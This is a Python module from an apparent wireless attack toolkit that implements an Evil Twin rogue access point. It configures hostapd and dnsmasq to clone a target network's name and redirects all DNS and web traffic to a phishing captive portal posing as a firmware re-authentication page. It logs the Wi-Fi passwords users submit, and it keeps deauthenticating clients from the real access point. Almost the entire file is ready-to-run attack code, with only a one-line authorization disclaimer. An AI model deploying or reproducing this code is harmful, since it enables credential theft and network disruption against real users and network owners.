"""Evil Twin / Rogue AP module - creates a fake access point to capture credentials.

An Evil Twin attack works by:
1. Creating a fake AP with the same SSID as the target
2. Deauthenticating clients from the real AP
3. Clients automatically reconnect to the Evil Twin (stronger signal)
4. A captive portal asks the user to enter their WiFi password
5. The entered password is captured and can be verified

This is a social engineering attack that bypasses brute-force entirely.
It works against ANY password strength, including WPA3.

Requirements:
- Two wireless interfaces (one for the fake AP, one for deauth)
- hostapd for creating the AP
- dnsmasq for DHCP/DNS
- A captive portal web server (built-in with Python)

IMPORTANT: This attack requires explicit authorization from the network owner.
"""

import os
import subprocess
import threading
import signal
import time
import http.server
import socketserver
import urllib.parse

from config import BASE_DIR
from utils import (
    find_binary, print_status, print_success, print_error,
    print_warning, print_info, Colors
)

# Lazily imported from config since it might not exist yet
def find_binary(name):
    """Find a binary on the system."""
    import shutil
    path = shutil.which(name)
    if path:
        return path
    for prefix in ["/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]:
        candidate = os.path.join(prefix, name)
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    return None


HOSTAPD_BIN = find_binary("hostapd")
DNSMASQ_BIN = find_binary("dnsmasq")

EVILTWIN_DIR = os.path.join(BASE_DIR, "eviltwin")
os.makedirs(EVILTWIN_DIR, exist_ok=True)

# HTML template for the captive portal
CAPTIVE_PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f0f2f5;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px; max-width: 400px; width: 90%%;
        }
        .logo { text-align: center; margin-bottom: 20px; font-size: 48px; }
        h1 { text-align: center; color: #1a1a1a; margin-bottom: 8px; font-size: 20px; }
        p { text-align: center; color: #666; margin-bottom: 24px; font-size: 14px; }
        label { display: block; margin-bottom: 6px; color: #333; font-weight: 500; }
        input[type="password"] {
            width: 100%%; padding: 12px; border: 1px solid #ddd; border-radius: 8px;
            font-size: 16px; margin-bottom: 16px;
        }
        button {
            width: 100%%; padding: 12px; background: #0066ff; color: white;
            border: none; border-radius: 8px; font-size: 16px; cursor: pointer;
        }
        button:hover { background: #0052cc; }
        .error { color: #e53e3e; text-align: center; margin-top: 12px; display: none; }
        .footer { text-align: center; color: #999; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">&#128274;</div>
        <h1>Network Authentication Required</h1>
        <p>Your connection to <strong>%s</strong> requires re-authentication.
           Please enter the network password to continue.</p>
        <form method="POST" action="/auth">
            <label for="password">Network Password</label>
            <input type="password" id="password" name="password"
                   placeholder="Enter WiFi password" required minlength="8">
            <button type="submit">Connect</button>
        </form>
        <div class="error" id="error">Incorrect password. Please try again.</div>
        <div class="footer">Firmware update required re-authentication</div>
    </div>
</body>
</html>"""

CAPTIVE_SUCCESS_HTML = """<!DOCTYPE html>
<html><head><title>Connected</title>
<style>
body { font-family: sans-serif; display: flex; justify-content: center;
       align-items: center; min-height: 100vh; background: #f0f2f5; }
.container { background: white; border-radius: 12px; padding: 40px;
             text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
h1 { color: #38a169; }
</style></head>
<body><div class="container">
<h1>&#9989; Connected Successfully</h1>
<p>Please wait while your connection is being restored...</p>
</div></body></html>"""


class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler for the captive portal."""

    ssid = "WiFi"
    captured_passwords = []
    verify_func = None

    def do_GET(self):
        """Serve the captive portal login page."""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write((CAPTIVE_PORTAL_HTML % self.ssid).encode())

    def do_POST(self):
        """Handle password submission."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        password = params.get("password", [""])[0]

        if password:
            self.captured_passwords.append({
                "password": password,
                "client_ip": self.client_address[0],
                "timestamp": time.time(),
            })
            print(f"\n  {Colors.GREEN}{Colors.BOLD}"
                  f"[CAPTURED] Password: {password} "
                  f"(from {self.client_address[0]})"
                  f"{Colors.RESET}")

        # Show success page
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(CAPTIVE_SUCCESS_HTML.encode())

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


class EvilTwin:
    """Creates a rogue AP with a captive portal to capture WiFi passwords.

    Requires two wireless interfaces:
    - ap_interface: Creates the fake AP (must support AP mode)
    - deauth_interface: Sends deauth frames (must support monitor mode)
    """

    def __init__(self, ap_interface, deauth_interface, target_bssid,
                 target_ssid, target_channel):
        self.ap_interface = ap_interface
        self.deauth_interface = deauth_interface
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.captured_passwords = []
        self._processes = []
        self._threads = []
        self._stop_event = threading.Event()

    def _check_prerequisites(self):
        """Verify required tools are installed."""
        missing = []
        if not HOSTAPD_BIN:
            missing.append("hostapd")
        if not DNSMASQ_BIN:
            missing.append("dnsmasq")
        if missing:
            print_error(f"Missing tools: {', '.join(missing)}")
            print_info(f"Install: sudo apt install {' '.join(missing)}")
            return False
        return True

    def _generate_hostapd_conf(self):
        """Generate hostapd configuration for the rogue AP."""
        conf_path = os.path.join(EVILTWIN_DIR, "hostapd.conf")
        conf = (
            f"interface={self.ap_interface}\n"
            f"driver=nl80211\n"
            f"ssid={self.target_ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.target_channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
            f"wpa=0\n"  # Open network (no password) to allow easy connection
        )
        with open(conf_path, "w") as f:
            f.write(conf)
        return conf_path

    def _generate_dnsmasq_conf(self):
        """Generate dnsmasq configuration for DHCP and DNS redirect."""
        conf_path = os.path.join(EVILTWIN_DIR, "dnsmasq.conf")
        conf = (
            f"interface={self.ap_interface}\n"
            f"dhcp-range=10.0.0.10,10.0.0.100,12h\n"
            f"dhcp-option=3,10.0.0.1\n"   # Gateway
            f"dhcp-option=6,10.0.0.1\n"   # DNS
            f"server=8.8.8.8\n"
            f"log-queries\n"
            f"log-dhcp\n"
            f"address=/#/10.0.0.1\n"       # Redirect ALL DNS to us (captive portal)
        )
        with open(conf_path, "w") as f:
            f.write(conf)
        return conf_path

    def _setup_network(self):
        """Configure the AP interface with a static IP."""
        cmds = [
            ["ip", "link", "set", self.ap_interface, "down"],
            ["ip", "addr", "flush", "dev", self.ap_interface],
            ["ip", "addr", "add", "10.0.0.1/24", "dev", self.ap_interface],
            ["ip", "link", "set", self.ap_interface, "up"],
        ]
        for cmd in cmds:
            subprocess.run(cmd, capture_output=True, timeout=5)

    def _enable_ip_forwarding(self):
        """Enable IP forwarding for the captive portal."""
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True, timeout=5
        )

    def _setup_iptables(self):
        """Configure iptables to redirect HTTP traffic to captive portal."""
        rules = [
            # Redirect port 80 to our captive portal
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", self.ap_interface, "-p", "tcp", "--dport", "80",
             "-j", "REDIRECT", "--to-port", "8080"],
            # Redirect port 443 to our captive portal
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", self.ap_interface, "-p", "tcp", "--dport", "443",
             "-j", "REDIRECT", "--to-port", "8080"],
        ]
        for rule in rules:
            subprocess.run(rule, capture_output=True, timeout=5)

    def _cleanup_iptables(self):
        """Remove iptables rules."""
        subprocess.run(
            ["iptables", "-t", "nat", "-F"],
            capture_output=True, timeout=5
        )

    def _start_captive_portal(self, port=8080):
        """Start the captive portal web server."""
        CaptivePortalHandler.ssid = self.target_ssid
        CaptivePortalHandler.captured_passwords = self.captured_passwords

        server = socketserver.TCPServer(("0.0.0.0", port), CaptivePortalHandler)
        server.timeout = 1

        def serve():
            while not self._stop_event.is_set():
                server.handle_request()
            server.server_close()

        t = threading.Thread(target=serve, daemon=True)
        t.start()
        self._threads.append(t)
        return server

    def start(self, deauth_continuous=True):
        """Launch the Evil Twin attack.

        Args:
            deauth_continuous: Keep deauthing clients from real AP.

        Returns:
            list: Captured passwords.
        """
        if not self._check_prerequisites():
            return []

        print_status("Starting Evil Twin attack...")
        print_info(f"  Target SSID: {self.target_ssid}")
        print_info(f"  Target BSSID: {self.target_bssid}")
        print_info(f"  Channel: {self.target_channel}")
        print_info(f"  AP interface: {self.ap_interface}")
        print_info(f"  Deauth interface: {self.deauth_interface}")
        print()

        try:
            # Step 1: Setup network
            print_status("Configuring network interface...")
            self._setup_network()
            self._enable_ip_forwarding()
            self._setup_iptables()

            # Step 2: Start hostapd (rogue AP)
            print_status("Starting rogue access point...")
            hostapd_conf = self._generate_hostapd_conf()
            hostapd_proc = subprocess.Popen(
                [HOSTAPD_BIN, hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            self._processes.append(hostapd_proc)
            time.sleep(2)

            if hostapd_proc.poll() is not None:
                print_error("hostapd failed to start.")
                stdout = hostapd_proc.stdout.read()
                if stdout:
                    print_info(f"  {stdout[:200]}")
                return []
            print_success("Rogue AP started.")

            # Step 3: Start dnsmasq (DHCP + DNS)
            print_status("Starting DHCP/DNS server...")
            dnsmasq_conf = self._generate_dnsmasq_conf()
            dnsmasq_proc = subprocess.Popen(
                [DNSMASQ_BIN, "-C", dnsmasq_conf, "-d"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            self._processes.append(dnsmasq_proc)
            time.sleep(1)
            print_success("DHCP/DNS server started.")

            # Step 4: Start captive portal
            print_status("Starting captive portal on port 8080...")
            self._start_captive_portal(port=8080)
            print_success("Captive portal running.")

            # Step 5: Continuous deauth of real AP
            if deauth_continuous:
                print_status("Starting continuous deauth on real AP...")
                from deauth import DeauthAttack
                deauth = DeauthAttack(
                    self.deauth_interface,
                    self.target_bssid,
                    client=None  # Broadcast
                )

                def deauth_loop():
                    while not self._stop_event.is_set():
                        deauth.start(count=10, bursts=1, blocking=True)
                        self._stop_event.wait(5)

                t = threading.Thread(target=deauth_loop, daemon=True)
                t.start()
                self._threads.append(t)

            # Wait for passwords
            print()
            print(f"{Colors.BOLD}{'=' * 55}")
            print(f"  Evil Twin active. Waiting for credentials...")
            print(f"  Press Ctrl+C to stop.")
            print(f"{'=' * 55}{Colors.RESET}")
            print()

            while not self._stop_event.is_set():
                self._stop_event.wait(1)

        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

        return self.captured_passwords

    def stop(self):
        """Stop all Evil Twin components and clean up."""
        self._stop_event.set()

        print()
        print_status("Shutting down Evil Twin...")

        # Stop all subprocesses
        for proc in self._processes:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()

        # Clean up iptables
        self._cleanup_iptables()

        # Report results
        if self.captured_passwords:
            print()
            print(f"{Colors.BOLD}{Colors.GREEN}{'=' * 55}")
            print(f"  CAPTURED {len(self.captured_passwords)} PASSWORD(S):")
            print(f"{'=' * 55}{Colors.RESET}")
            for entry in self.captured_passwords:
                print(f"  {Colors.GREEN}Password: {entry['password']}"
                      f"  (from {entry['client_ip']}){Colors.RESET}")
            print()
        else:
            print_warning("No passwords captured.")

        print_success("Evil Twin stopped. Network cleaned up.")
